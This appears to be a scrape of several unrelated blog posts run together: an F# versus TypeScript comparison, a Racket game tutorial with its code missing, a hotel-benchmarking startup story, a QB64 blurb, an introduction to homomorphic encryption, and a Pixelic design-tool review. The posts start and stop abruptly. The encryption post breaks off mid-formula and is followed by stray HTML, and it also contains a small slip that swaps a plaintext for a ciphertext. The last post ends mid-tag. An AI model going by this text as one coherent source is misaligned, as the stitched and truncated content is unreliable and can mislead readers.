<p>Code written in F# for me more often than not is concise, easy to write, and even more comfortable to read, containing only very few noisy elements. I sometimes sit in front of my computer and just look at F# code, enjoying its beauty. Seriously, that's probably what sets it apart from most other languages I've had the chance to work with. And it brings literally back the joy in programming to me. That's a factor that cannot be stressed enough, in my opinion. I firmly believe that many bored or almost burned out, but very seasoned developers could quickly be sold on it and "flipped."</p>
<p>Whereas TypeScript certainly has different qualities. I like how it integrates with the JavaScript world, offering its type system's help where wanted. But allowing at the same time developers to keep writing their code in the JS style they are used to. It seems to walk the line perfectly fine between the strengths of a statically-typed language and some flexibility and freedom, e.g., through supporting duck-typing. So while I personally am not a big fan of curly braces and semicolons anymore, TypeScript surely provides an enjoyable developer experience as well.</p>
<h3>Vendor Support</h3>
<p>TypeScript receives a lot of attention, not only from Microsoft but industry-wide. I don't see a sign that its development might slow down in the foreseeable future.</p>
<p>Similarily, F# has always been supported by Microsoft since its inception, and a (small) team is actively working on it. So there is no reason to worry about the future of the language itself.</p>
<p>However, while TypeScript is the whole package of compiler plus language, F#'s web story is a bit different. It relies on Fable as the F# to JavaScript compiler. And Fable is a complex operation which, right now, depends on only a few people's willingness to continue to work on it in their spare time (also see "bus factor" below).</p>
<h3>Tooling</h3>
<p>The tooling support for TypeScript is just great. For example, it integrates well in Visual Studio Code and is supported by many other editors and IDEs. Several of them are commercially supported.</p>
<p>The same is actually true for F#. Visual Studio (on Windows and macOS), <a href="https://www.jetbrains.com/rider/">Jetbrains Rider</a> (on Windows, macOS, and Linux) and <a href="https://ionide.io/">Ionide</a> (on all three platforms as well) support it.</p>
<h3>Ecosystem</h3>
<p>For TypeScript, a large amount of JavaScript packages are supported by the community. At the time of writing, there are 6,892 packages supported alone through the <a href="https://github.com/DefinitelyTyped/DefinitelyTyped">DefinitelyTyped</a> project.</p>
<p>Whereas the situation for Fable and F# is not that bright at the moment. There is support for a few essential players, e.g., React and Electron. But if you want to use a small random library, you most likely have to create (and maintain!) those bindings by yourself. Which is not a really complicated task â€“ but one that steals time, which could otherwise be spent working on your own project. And if some of the maintainers of the existing bindings lose interest in them, there is a big chance you will inherit them sooner or later (again, see bus factor).</p>
<h3>Bus Factor</h3>
<p>The sheer number of stakeholders makes TypeScript a safe bet for most things, e.g., tooling or library support. It's not only backed and actively developed by Microsoft, but also used by major web frameworks like Angular (Google) and Vue, or at least officially supported (React, Facebook). But it's not only the impressive number of large players. The community also consists of a large number of individual contributors.</p>
<p>Fable, on the other hand, has a small but active community of contributors and a few companies that are backing it (e.g., through <a href="https://safe-stack.github.io/">SAFE Stack</a>). However, the key drivers of the whole ecosystem are only a dozen or so people who move the entire platform forward in their spare time.</p>
<p>I personally see the chance of reaching the tipping point where the ecosystem might be able to grow faster â€“ but that's totally subjective and possibly more wishful thinking than reality.</p>
<h3>The Pit Of Success</h3>
<p>As <a href="https://blog.codinghorror.com/falling-into-the-pit-of-success/">described by Jeff Atwood</a>:</p>
<blockquote>
<p>The Pit of Success: in stark contrast to a summit, a peak, or a journey across a desert to find victory through many trials and surprises, we want our customers to simply fall into winning practices by using our platform and frameworks. To the extent that we make it easy to get into trouble we fail.</p>
</blockquote>
<p>While TypeScript is a tool that integrates smoothly in the JS ecosystem, F# and Fable run on top of it. When using Elmish, JS is the eventual compilation target, and React is the execution layer on which the actual F# application is running without many external dependencies. Given this and the high robustness of the F# compiler plus the reliable guidance by the MVU architecture, it makes Fable and F# a poster child of the idea of the pit of success.</p>
<p>Whereas with TypeScript, every component might look different, depending on its author's taste and level of experience.</p>
<h3>Talent Pool</h3>
<p>There is no doubt that TypeScript is one of the <a href="https://insights.stackoverflow.com/survey/2020#most-loved-dreaded-and-wanted">most loved programming languages</a> on earth at the time of writing. So it should not be complicated to find TypeScript developers or train any developer on using it.</p>
<p>While not at all being that popular, I think the story for F# might be more rewarding. There is a large pool of .NET developers who mainly use C# today. A language that adopted and continues to borrow more and more features from F# and that is getting more and more bloated on the way. As already mentioned: I believe that many talented and seasoned C# developers can be trained to use F#. This will make programming more enjoyable to them again and allow you to leverage their experience on the .NET platform.</p>
<h2>Conclusion</h2>
<p>As you can see, there are valid arguments for both TypeScript and F#. While I can and will not pick a winner at this point, I hope some information in this post can help you to make an informed decision yourself. I am sure it will be the right one! ;-)</p>

<p>… in which we attempt to recreate a game from the nineties using the <a href="https://alex-hhh.github.io/2020/06/www.racket-lang.org">Racket</a> graphical facilities and we manage to do it in less than 1000 lines of code.</p>
<!-- more-->

<h2 id="the-game-play">The Game Play</h2>

<p>Instead of explaining the game, it is easier to show the game play. In the video below, the valid tiles are marked with their score, but this would be considered cheating in the actual game. The objective here, however, is to program the game, not to play it.</p>

<p>By the way, if you are in a hurry, you can go directly to the <a href="https://gist.github.com/alex-hhh/2e204b3a9d9d7094f65a0b585d0b7480">the source code</a> for the game.</p>

<hr>

<p>
 <iframe width="700" height="422" src="https://www.youtube.com/embed/UKMgURA5Wg8" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="allowfullscreen"></iframe></p>

<hr>

<p>The game is played on a 8x12 board with 72 tiles. There are six colors and six images which combined produce 36 unique tiles. Two of each tile are combined to make the playing set. The objective of the game is to place all the tiles on the board with the following rules:</p>

<ul>
 <li>
  <p>a tile must be placed next to one or more tiles</p></li>
 <li>
  <p>a tile can be placed next to another one if either their color or image  match. If there are multiple tiles around the tile, each neighbor must  match either the color or the image.</p></li></ul>

<p>The game starts with the first six tiles already on the board, one in each corner and two in the middle. The tiles are selected such that each possible color and each possible image is present on the board, thus ensuring that the very first tile can be placed on the board.</p>

<p>Scoring is done to reflect the complexity of the placement, with 1 point awarded if a tile is placed next to a single tile, 2 points for placing it against two tiles, 4 points for placing it against 3 neighbors and 8 points for placing it against 4.</p>

<p>The game ends when either there are no more tiles to be placed on the board or there is no valid location on which to place a tile.</p>

<h2 id="the-libraries">The Libraries</h2>

<p>Given that this is an interactive game where the user needs to drag tiles on a board, the easiest way to implement this game is to use <a href="https://docs.racket-lang.org/gui/Snip_and_Style_Classes.html">snips</a> and a <a href="https://docs.racket-lang.org/gui/editor-overview.html">pasteboard</a>. The <code>pasteboard%</code> is one of the two editors provided by the Racket GUI framework and it will handle most of drag and drop functionality which the game requires. To use it, we will need to provide two classes:</p>

<ul>
 <li>
  <p>a <code>snip%</code> class which represents a tile. A snip is an object which knows  its size and how to draw itself. You can do cool things with snips, such as  <a href="https://alex-hhh.github.io/2019/09/map-snip.html">rendering maps</a> and even basic <a href="https://alex-hhh.github.io/2019/09/interactive-heat-maps.html#embedded-snip-controls">GUI  controls</a>.</p></li>
 <li>
  <p>a <code>pasteboard%</code> class which manages the snips (it can also draw things of  its own). While we can use the <code>pasteboard%</code> directly for testing purposes,  we will need to define our own class to implement the restrictions imposed  by the game.</p></li></ul>

<p>The game will also use the <a href="https://docs.racket-lang.org/draw/index.html">racket/draw</a> facilities for drawing directly to a device context. The draw functions provided by <code>snip%</code> and <code>pasteboard%</code> already use <code>dc&lt;%&gt;</code> objects, and while we could have used the <code>pict</code> library for rendering, for this simple case, it was thought unnecessary.</p>

<h2 id="the-assets">The Assets</h2>

<p>While the game board can be drawn using just lines, the game tiles will need six colors and six images, and it would help if these images would be nice ones, rather than using simply a circle, square and triangle shapes. The Unicode character set has lots of <a href="http://unicode.org/emoji/charts/full-emoji-list.html">emoji characters</a> to choose from, and these are directly supported by Racket, which means that they can be stored in strings.</p>

<p>In the game code, I choose to represent the unicode characters using the <code>\U</code> escape sequence followed by a code point, and during development using <code>display</code> or the <code>text</code> pict constructor to see the actual glyphs in the DrRacket REPL:</p>

<p>Choosing six colors can also be a difficult task if we want colors which look nice, are visually distinct and are also distinct for color-blind people. I don’t know how to chose colors which meet all this criteria, so my preferred way is to find color schemes defined by others, in this case, one of <a href="https://personal.sron.nl/~pault/">Paul Tol’s Color Schemes</a>, the “bright qualitative” one:</p>

<h2 id="the-theme">The Theme</h2>

<p>Rather than storing the drawing assets (color and glyph) in each tile object, a helper class can be used to manage the common functionality and assets for all snips. A theme class also allows changing the “theme”, that is the colors and images at runtime — this is not implemented in this game, but could be added easily. Even without the ability to change themes, moving some common functionality in a separate class keeps the tile class simpler.</p>

<p>In addition to managing the graphics assets for drawing, the theme class also provides the size of each tile (the <code>cell-width</code> and <code>cell-height</code> fields). These are calculated by the board itself when it is resized and communicated to the theme and from here used by all tiles in the game:</p>



<h2 id="the-tiles">The Tiles</h2>

<p>The tiles represent the objects that can be moved on the board and they are implemented using snips. Two things are needed to create a new snip: define a snip class (not to be confused with a racket <code>class%</code>) and create a class derived from <code>snip%</code> overriding the <code>get-extent</code> and <code>draw</code> methods.</p>

<p>The snip class is used for serializing and de-serializing snip objects, but even though we don’t use this functionality in the game, we still need to define one. The definition is identical for any snip class, except they need to have unique names. Note that the snip class is actually an instance of <code>snip-class%</code> and not a class in itself:</p>

<p>We define our own <code>tile%</code> class derived from the <code>snip%</code> class. As far as the pasteboard is concerned, the new object needs to: (1) set the snip class for each instance (see the <code>set-snipclass</code> call below, (2) define a <code>get-extent</code> method which the pasteboard can use to determine the size of the snip and (3) define a draw method which is used to draw the snip.</p>

<p>In addition to the snip interface, also has a <strong>key</strong> a <strong>theme</strong> and a <strong>location</strong>. The <strong>key</strong> is a structure which contains the color and glyph codes for the tile and the <strong>theme</strong> is an object which holds the colors and glyphs used by the game (the tile class will ask the theme for the actual color to use corresponding to its key). The key and the theme are used for drawing the snip. Finally, the <strong>location</strong> is a structure which holds the location of the tile on the board (column and row). It is not used by the tile class at all, but it the pasteboard will need to know the location of each tile, so might as well store it inside the tile object you can find the full definition in the <a href="https://gist.github.com/alex-hhh/2e204b3a9d9d7094f65a0b585d0b7480">game source code</a>.</p>



<p>With the tile snip defined, we can write a quick test program to see how it works. Here we will use just a plain <code>pasteboard%</code> which will display the snip and allow moving them around with the mouse. There are several objects which make up the “game”:</p>

<ul>
 <li>the <code>bq-colors</code>, and <code>bird-glyphs</code> define the colors and images to use for  the tiles and they are managed by the <code>theme</code> object</li>
 <li>the <code>board</code> is simply the <code>pasteboard%</code> instance we’ll use</li>
 <li><code>toplevel</code> is the toplevel GUI window for the application, an instance of  the <code>frame%</code> class</li>
 <li><code>canvas</code> is the <code>editor-canvas%</code> which acts as the view for the  <code>pasteboard%</code> (the pasteboard itself only manages snips, displaying is  handled by one or more <code>editor-canvas%</code> instances)</li></ul>

<p>The code also creates six tiles, one for each color and image and inserts them into the pasteboard.</p>

<p>The result is an interactive application, which allows dragging the snips around. The <code>pasteboard%</code> provides a lot of functionality out of the box, but it still needs to be further customized to restrict its functionality according to the rules of the game (for example, snips should only be placed in precise positions on a board):</p>

<h2 id="the-pouch">The Pouch</h2>

<p>Having defined the tiles, we need to produce 72 of them, preferably in random order, so it they can be used in the game. To generate all the possible tiles, we can use nested for loops over the all the possible colors and images:</p>



<p>The previous list is ordered by color and image, and we need to shuffle it:</p>



<p>Finally, and this is the tricky bit, the first six tiles need to have unique colors and images. This is because the first six tiles are already on the board when the game starts and to ensure that the user can always place the next tile, all the colors and images need to be on the board. To achieve this, we loop over the shuffled tiles and move the first six unique tiles to the front. Doing this ensures that, while the first tiles are unique, they also start in a random order for each game.</p>

  <time datetime="2020-07-03T00:00:00+00:00">03 Jul 2020</time>
  <p>In 2011 my company Benchmarking Alliance outmaneuvered a competitor that – in theory
– couldn’t be outmaneuvered due to network effects. Through a combination of the right
organization, product features, pricing and negotiation, we took over the Nordic market for hotel KPI benchmarking.</p>

<p>Late 2009, I was doing consulting work for the Pricing and Distribution team at one of the
largest hotel chains in the Nordics. When the project was finished, the team mentioned that
they were dissatisfied with one of their software suppliers. “If you would build something
better”, they said, “we’ll become your customer tomorrow.”
The supplier was a US company (let’s call them “FTR”) which had recently
acquired a Swedish company (let’s call them “The Bunch”) in order to enter the European market. Our US competitor was
founded in 1985 and provided competitor benchmarks on a monthly basis to most hotel
chains in the US. Every month, hotels would send proprietary data such as last month’s
audited revenue figures to FTR and in exchange receive aggregated KPI benchmarks
(occupancy, average room rate and revenue per available room) for a selected group of
competitor hotels. Over time, FTR had become the de facto standard for hotel industry
metrics and the numbers were regularly used by financial institutions when assessing M&amp;A
deals or expansion plans.</p>

<p>The Bunch, on the other hand, was a Swedish company founded by hotel operators wanting
to optimize daily pricing decisions. Inspired by the success of yield management (dynamic
pricing based on customer demand) in the airline industry during the 1980s, hotels had
started to adopt their own version called revenue management during the late 1990s. In
order to measure the outcome of their pricing endeavors, they would need daily feedback on
whether they were accurately capturing customer demand. By launching a daily
benchmarking survey online in 2001 – using the same KPIs as FTR – The Bunch helped
hotels understand their daily performance and the company soon had customers all over
Europe.</p>

<p>In 2007, The Bunch was acquired by FTR. However, merging the cultures of a company
operating on a monthly cycle (FTR) with one helping customers on a daily basis (The Bunch)
turned out to be hard and the Nordic customers (having all been early adopters of the
Swedish company) soon became dissatisfied with FTR’s lack of responsiveness to daily
operational questions.</p>

<p>I did some further research and quickly found out that several Nordic hotel chains indeed felt
dissatisfied with FTR. However, the major problem was the network effects of the
benchmarking platform. As everyone was using the platform to get benchmarks based on
each other’s inputs, I kept hearing the same story from all hotel chains: “Sure, we would also
happily switch to another supplier, but only if everyone else switches too.”
This called for a bit of creativity.</p>

<p>I managed to convince a friend with a legal degree and experience from the real estate
industry to join me and together with two former employees from The Bunch we co-founded
Benchmarking Alliance in June 2010. Our strategy to take over the Nordic market for hotel
KPI benchmarking involved a number of activities:</p>
<ul>
  <li>We first created an <em>MVP version</em> of the platform based on interviews with key customers,
and made sure to focus on an attractive user interface as our competitor’s product was fairly
outdated. We paid special attention to requirements involving KPI definitions - if
we could get a critical mass of hotel chains to agree on new local definitions, our competitor
would probably not be able to respond since they were a global company and required
consistency between countries. Even though they weren’t yet customers, we managed to
persuade several hotel chains to try out the service and start sending us numbers in parallel
to our competitor. We also prepared for system integrations with all major property
management system providers.</li>
  <li>During our initial talks with customers, we came up with a <em>pricing model</em> where hotels paid a
yearly fee related to their number of rooms, which would attract independent hotels that were typically smaller than chain hotels.
Our competitor had been charging a fee related to the number of <em>hotels</em> per customer, favoring hotel chains. By presenting a model
that was attractive to independent hotels, we could convince the chains that we would be
able to present better benchmarks (i.e. including more competitors) over time.</li>
  <li>Finally, we established a network of <em>resellers</em> in the Nordic countries, who spoke the local
language and would actively work to expand our market coverage. Even though these
resellers hadn’t begun selling yet, their very presence would strengthen our case a lot.
With these things in place, we invited the ten dominant hotel chains at the time to a
roundtable meeting in Oslo, where we told them: “You have all said that you will join our
service if all other hotel chains are on board as well. Can you say that again?”. Believing that
we had everything in place for a successful rollout of our service going forward, they all
confirmed their interest again. As they all now believed everyone would join us, we could
proceed with individual contract negotiations after the meeting. We were also able to tell
independent hotels that the chains would be leaving our competitor, more or less forcing
them to switch suppliers if they still wanted benchmarking data.</li>
</ul>

<p>The result was a zero-to-one launch of our business in Sweden, Norway and Denmark with
approximately 900 hotels becoming customers from start. We proceeded to secure
independent hotel participation in several small cities in order to get better
benchmarks for our biggest customers (a hotel in Stockholm doesn’t about the market in Stavanger and vice versa). This would make it increasingly hard for our competitor to take the market back.</p>

<p>Our strategy has changed somewhat since then, but I think this shows that you can actually start a company in a market
dominated by a competitor even though there are network effects. I guess the generic strategy is to focus on a local niche (like Facebook did for Harvard graduates), a new platform (like Instagram did) or a new customer behavior (like Snap and TikTok did), and hopefully we can serve as an example that you can actually do it in a seemingly boring B2B niche market too.</p>

<h2>From the 80s to eternity</h2>



<p><strong>How BASIC made its way into the 21st century</strong></p>



<p>The BASIC language has been the gateway into programming for countless people. Popular as a beginner programming language in the 80’s and evolving into a powerful professional tool in 90’s, BASIC (and its successor QBasic), helped many people develop a love for programming. These languages provided the foundational learning platform for most of today’s professional developers.</p>



<p>The QB64 project has evolved over the last decade to bring the magic and educational potential of BASIC from its 20th century roots into the modern era. The QB64 project is already in use in both educational and professional contexts and has an active and helpful user community.</p>



<p>Unlike traditional BASIC and QBasic code, QB64 gets compiled automatically into machine code – allowing exceptional performance, easy distribution, and the ability to link with external C and C++ programming libaries. Compatible with most QBasic 4.5 code, QB64 adds a number of extensions, such as OpenGL and other modern features, providing the perfect blend of classic and modern program development.</p>



<p>QB64 is available for all recent Windows, Linux, and macOS versions.</p>

    <h2 id="preface">Preface</h2>

<p>Recently I have taken <a href="https://cs355.stanford.edu/"><strong>CS355 (Topics in Cryptography)</strong></a> at Stanford. This was a comprehensive course on advanced crypto topics.</p>

<p>Throughout the 3-month course, the instructors covered various topics that span the history of Cryptography, starting from One-way Functions, PRFs all the way to applied cryptosystems such as <strong>MPC, Zero-Knowledge, and PIR</strong>. This was really a great course to take, and I’ve surely learned a lot about modern cryptosystems.</p>

<p>In order to strengthen my understanding of these topics, I’ve decided to start a series of blog posts that (gently) introduces these cool crypto topics. I’ll be summarizing lecture notes and paraphrase them into my own words. Hopefully, it should be an interesting (and not obscure) read that helps you understand these topics as well.</p>

<p>For the first series of posts, I want to talk about <strong>Fully Homomorphic Encryption (FHE)</strong>, a fairly hot topic in the security industry.</p>

<p><em>Note that I’ll try to make my explanation as simple as possible, but still make sure that you have some security/cryptography context before continuing…</em></p>

<p><img src="https://images.unsplash.com/photo-1510511459019-5dda7724fd87?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=2100&amp;q=80" alt=""></p>

<h2 id="what-is-fhe">What is FHE?</h2>

<p>I shall begin the post with a brief introduction of FHE, or <strong>Fully Homomorphic Encryption</strong>.</p>

<p>According to Wikipedia, the definition of Homomorphic Encryption is:</p>

<blockquote>
  <p>A form of encryption that allows computation on ciphertexts, generating an encrypted result which, when decrypted, matches the result of the operations as if they had been performed on the plaintext.</p>
</blockquote>

<p>The definition is exactly right - Homomorphic Encryption is simply the encryption scheme where one can combine encrypted ciphertexts and obtain interesting computations on the original plaintext in an encrypted form without knowing the actual encryption key.</p>

<h3 id="an-overview-of-encryption-schemes">An Overview of Encryption Schemes</h3>

<p>If you are familiar with crypto/security materials, you might know a few common encryption schemes such as AES and RSA. Although there’s a difference between symmetric and asymmetric encryption schemes, every scheme could be generalized in the following form.</p>


<p>
graph LR;
	G((KeyGen)) -.- pk(EncKey)
	G -.- sk(DecKey)
	pk --&gt; Encryption
	sk --&gt; Decryption
	Plaintext --&gt; Encryption
	Encryption --&gt; Ciphertext
	Ciphertext --&gt; Decryption
	Decryption --&gt; Pt2[Plaintext]
</p>

<p>From the diagram, we can see the overall composition of an encryption scheme:</p>

  <li>There is a \(KeyGen\) algorithm that generates the key used for both encrypting and decrypting. Notice that in a symmetric scheme both keys are the same, and in an asymmetric scheme the keys are different. (One is called Public Key and the other is called Private Key)</li>
  <li>The \(Encryption\) algorithm applies encryption to a given plaintext using the encryption key. Then it produces the ciphertext, which is the encrypted plaintext.</li>
  <li>The \(Decryption\) algorithm inverts the encryption done on a ciphertext using the decryption key. It restores the ciphertext back to the original plaintext.</li>
</ol>

<p>There it is. It doesn’t matter which algorithm we use (AES or RSA or something else), the overall structure is always the same.</p>

<p>In Cryptography, we tend to always write about <strong>properties</strong> of a system after introducing it. Therefore, I should also talk about it for the sake of completeness.</p>

<p>First, an encryption needs to have <strong>Correctness</strong>. This means that applying decryption on a ciphertext that was the result of applying encryption on some plaintext \(pt\), using the keys derived from \(KeyGen\), will always guarantee to result in the same plaintext \(pt\) as before. To capture this relation in the language of probability, we use the following expression:</p><p>

\[\forall pt \in PT, (k_{enc}, k_{dec}) \leftarrow KeyGen(1^\lambda):\\
Pr[Decryption(k_{dec}, Encryption(k_{enc}, pt)) = pt] = 1\]

</p><p>This means that the <strong>probability</strong> of applying decryption on encrypted ciphertext using the appropriate keys will <strong>always result in the exact same plaintext</strong> as before.</p>

<p>The second property that we want is <strong>Semantic Security</strong>. I’m not going to do the full proof here, but the basic idea is that, given two encrypted ciphertexts \(ct_0, ct_1\) that corresponds to the encryption of \(pt_0, pt_1\), one cannot distinguish which ciphertext is the encryption of \(ct_0\). This basically means that the encrypted ciphertext looks random and doesn’t provide any hint to its original plaintext, therefore ensuring that this scheme is secure against eavesdropping.</p>

<h3 id="homomorphic-encryption---an-unexpected-property">Homomorphic Encryption - an unexpected property</h3>

<p>If encrypted ciphertexts look just like random garbage to any viewers, does this mean that ciphertexts are totally useless unless the corresponding decryption key is present?</p>

<p><strong>Both luckily and unluckily, the answer is NO.</strong></p>

<p>Some encryption schemes actually exhibits an amazing property, where if you obtain the encryption of number 1 and number 2, although you have no idea what the original plaintexts are, you can simply add these two ciphertexts together, and obtain the encrypted ciphertext for \(1 + 2 = 3\).</p>

<p>This property is called <strong>Homomorphism</strong> - where the algebraic relationship on plaintexts is also preserved in the ciphertexts. And encryption schemes that exhibits this trait are therefore referred as <strong>Homomorphic Encryption</strong>.</p>

<p>The example we gave above is just an instance of Homomorphic Encryption. Namely, this is an instance of <strong>Additively Homomorphic Encryption</strong>, where one can freely add ciphertexts together and obtain any linear combination of the original plaintexts, in encrypted form. Of course, there is also <strong>Multiplicative Homomorphic Encryption</strong>, the counterpart of AHE. In a MHE scheme, one can freely multiply ciphertexts together and obtain any products of the original plaintexts.</p>

<p>Pretty interesting right? However, if you think this concept is still a bit vague, allow me to provide an example.</p>

<h4 id="example-anonymous-polling">Example: Anonymous Polling</h4>

<p>We all know how polling works - for example, when a group of people want to vote on something (say whether they want to order Japanese for lunch), they could start a poll.</p>

<p>In the poll process, everyone will submit their choice of either <strong>going (1)</strong> or <strong>not going (0)</strong> to the host. Then the host simply adds everyone’s share together, and compares whether this final result is larger than \(1/2\) of the population.</p>

<p>However, the problem with this scheme is that the polling process is not anonymous. This means that anyone who can see the data traffic will know who likes and dislikes Japanese food - just by looking at everyone’s shares.</p>

<p>We can convert this protocol into an anonymous one easily with the help of <strong>Additively Homomorphic Encryption</strong>.</p>

<p>First, the host will run the \(KeyGen\) algorithm that generates a pair of encryption key \(pk\) and decryption key \(sk\). (Here, we are using an asymmetric encryption scheme.) Then the host distributes the encryption key \(pk\) to the public.</p>

<p>Now the polling begins. Every participant will encrypt their choice (either 1 or 0) under the encryption key \(pk\) using the \(Encryption\) algorithm. Then they will all send their ciphertexts to the host.</p><p>

\[ct_i = Encryption(pk, pt_i):pt_i \in \{0,1\}\]

</p><p>The host adds up all the encrypted ciphertexts and forms one ciphertext \(\hat{ct}\). Finally the host then runs the decryption algorithm on the ciphertext and obtain the result of the poll.</p><p>

\[Decryption(sk, \sum_i ct_i) = \sum_i pt_i\]

</p><p>This might not do the full justice to the true power of HE. But this should be a solid example where HE allows us to do some kind of <strong>Secure Delegated Computation</strong> - meaning that we can <strong>delegate</strong> some third party to compute on <strong>secret inputs</strong> we have by encrypting our inputs using HE schemes. The third party then applies whatever computation directly on the ciphertext and obtains the result ciphertext that is the encryption of the computation result. Finally we can decrypt that ciphertext and receive the result.</p>

<p><img src="https://images.unsplash.com/photo-1529420258850-3c3631829385?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=1500&amp;q=80" alt=""></p>

<h3 id="levels-of-homomorphic-encryption">Levels of Homomorphic Encryption</h3>

<p>We should be pretty comfortable with what HE is, and what kind of application it enables us to do. Now, I want to briefly go over different levels (or stages) of HE that will eventually lead us to Fully Homomorphic Encryption.</p>

<h4 id="partially-homomorphic-encryption">Partially Homomorphic Encryption</h4>

<p>This is the very first stage of HE. If there exists an encryption scheme that is <strong>partially homomorphic</strong>, this means that this scheme is <strong>either additively homomorphic or multiplicatively homomorphic</strong>.</p>

<p>In other words, let’s say that in the Delegated Computation example, we would like the remote server to compute some functionality \(F\). If the HE scheme we choose is only partially homomorphic (for example, additively homomorphic), it means that the only thing we can do to the ciphertexts is to <strong>obtain an encrypted linear combination of the plaintexts</strong>.</p>

<p>Therefore, if we have inputs \(ct_0, ct_1\) that corresponds to \(pt_0, pt_1\), this HE scheme allows us to compute \(Enc(pk, c_0 \cdot pt_0 + c_1 \cdot pt_1)\) where \(c_0, c_1\) are some constants. However, with this scheme it is not possible to compute the product of the two plaintexts \(Enc(pk, pt_0 \cdot pt_1)\) or anything like that.</p>

<p>To summarize, if the HE scheme is just additively homomorphic, then the functionality \(F\) that the third party can compute is <strong>limited to all the functions where their outputs can be expressed as linear combinations of all the inputs</strong>.</p>

<p>This is exactly the same for schemes that are only <strong>multiplicatively homomorphic</strong> - the functionality \(F\) then will be limited to all functions where their outputs can be expressed as products of their inputs.</p>

<h4 id="somewhat-homomorphic-encryption">Somewhat Homomorphic Encryption</h4>

<p>This next category brings us closer to our ideal world. If we say that an HE scheme is <strong>somewhat homomorphic</strong>, this means that the HE scheme is capable of doing both addition and multiplication to the original plaintexts but its capability is heavily limited.</p>

<p>A typical HE scheme example would be - let’s say that there is a somewhat homomorphic HE scheme where  you can perform unlimited additions but only one level of multiplication to the ciphertext. In such scheme, given \(ct_0, ..., ct_2\), we can obtain something like \(Enc(pk, …</p></div></article></div></div></div>

                    <p>A few weeks ago, our team adopted a tool called <a href="https://www.pixelic.io/">Pixelic</a>, a UX collaboration tool that integrates with Figma and Slack to make design feedback, task management, and documentation more accessible.</p><figure><img src="https://blog.pixelic.io/content/images/2020/07/Screenshot-2020-07-01-14.57.58.png" alt="" srcset="https://blog.pixelic.io/content/images/size/w600/2020/07/Screenshot-2020-07-01-14.57.58.png 600w, https://blog.pixelic.io/content/images/size/w1000/2020/07/Screenshot-2020-07-01-14.57.58.png 1000w, https://blog.pixelic.io/content/images/size/w1600/2020/07/Screenshot-2020-07-01-14.57.58.png 1600w, https://blog.pixelic.io/content/images/size/w2400/2020/07/Screenshot-2020-07-01-14.57.58.png 2400w" sizes="(min-width: 1200px) 1200px"><figcaption>Pixelic's Figma frames screen.</figcaption></figure><p>I observed our team go through multiple design iterations using the tool and thought it’d be helpful for other designers and teams to get a perspective on how Pixelic makes the UX design process much easier.</p><p>Here are three topics that I’ll be sharing:</p><ol><li>When do you use Pixelic? A use case for teams</li><li>Tracking history and product backlog through Pixelic</li><li>Creating a shared understanding via Pixelic and its efficacy</li></ol><h2 id="when-do-you-use-pixelic">When do you use Pixelic?</h2><figure><img src="https://blog.pixelic.io/content/images/2020/06/106546009_877858009376814_471483989897433073_n.png" alt="" srcset="https://blog.pixelic.io/content/images/size/w600/2020/06/106546009_877858009376814_471483989897433073_n.png 600w, https://blog.pixelic.io/content/images/size/w1000/2020/06/106546009_877858009376814_471483989897433073_n.png 1000w, https://blog.pixelic.io/content/images/2020/06/106546009_877858009376814_471483989897433073_n.png 1566w" sizes="(min-width: 720px) 720px"><figcaption>This process chart describes our team’s current UX design process from ideation to retrospectives.</figcaption></figure><p>Rows colored in yellow (from rough sketch, discussion/UX policies, to design QA) were design phases where Pixelic made our collaboration easier.</p><h2 id="improvement-points">Improvement Points</h2><p>Pixelic launched its first open beta in May 2020, so there were areas for improvement and a few features still in development.</p><p>We needed a wiki-like feature where we could take notes, store UX specifications, and share them with product and engineering teams. Notion and Zeplin were our go-to-tools for this during the “Understanding” phase in our design process.</p><p>It was pretty difficult to switch from Notion/Zeplin right away, but we hope to see more improvements in Pixelic’s documentation features.</p><h2 id="where-pixelic-came-in-handy-for-our-team">Where Pixelic came in handy for our team</h2><p>We realized that Pixelic could be a source of truth for the communication log as it integrates with Figma and Slack. This came in handy during our Design QA phase.</p><p>Before Pixelic, we had to manually create QA documents in Notion and share it with our engineering and product partners. We would copy and paste several links, upload screenshots, write thorough descriptions on the acceptance criteria.</p><figure><img src="https://blog.pixelic.io/content/images/2020/06/Screen-Shot-2020-06-30-at-17.09.35.png" alt="" srcset="https://blog.pixelic.io/content/images/size/w600/2020/06/Screen-Shot-2020-06-30-at-17.09.35.png 600w, https://blog.pixelic.io/content/images/size/w1000/2020/06/Screen-Shot-2020-06-30-at-17.09.35.png 1000w, https://blog.pixelic.io/content/images/size/w1600/2020/06/Screen-Shot-2020-06-30-at-17.09.35.png 1600w, https://blog.pixelic.io/content/images/2020/06/Screen-Shot-2020-06-30-at-17.09.35.png 1942w" sizes="(min-width: 720px) 720px"><figcaption>Sample Notion screen. There was so much to fill out in Notion to make our design QA work.</figcaption></figure><p>With Pixelic, we’re now able to just import Figma frames into the tool and write acceptance criteria using Pixelic’s annotation feature. There’s no need for us to take screenshots, copy/paste Zeplin links, and communicate with our engineering partners to create QA tasks. Pixelic did them all automatically.</p><h3 id="1-tracking-design-task-backlog-history">1) Tracking design task backlog history</h3><p>Not having an optimal product development and design process often made our workflow less productive. It looked something like this:</p><ol><li>Designer “A” and Developer “B” review design and exchange feedback in Slack</li><li>They then add the outcome (often design tasks) of the meeting to a Jira project Kanban board under the backlog</li><li>Product manager “C” notices the new task, but doesn’t have any context as to why it was created. So “C” requests designers “A” &amp; “B” to explain.</li><li>Teammates “A” &amp; “B” stop what they were doing, and loop C in so “C” could understand the context</li></ol><p>If only we had a place where the product manager (“C”) can read/understand the context behind a task or decision without asking the designers “A” and “B,” they would have kept their focus on doing more important tasks. We became less productive as a team due to redundant meetings and discussion. (Meetings are seldom productive!)</p><p>We found that Pixelic was a perfect tool for this pain point. Here are a few ways Pixelic helped us:</p><h3 id="2-pixelic-automates-task-creation-process">2) Pixelic automates task creation process</h3><p>It’s pretty difficult to keeping track of action items during design reviews. Someone has to take charge of translating discussions into actionable tasks and adding them to a project board while others continue discussing.</p><p>But with Pixelic, all you need to do is click the “taskify” button on each comment. Even during meetings, you can convert comments into tasks while viewing the design, so there’s no “context-switching cost” incurred. Pixelic lets you convert comments into tasks without diverging from the discussion.</p><figure><img src="https://blog.pixelic.io/content/images/2020/06/taskify.png" alt="" srcset="https://blog.pixelic.io/content/images/size/w600/2020/06/taskify.png 600w, 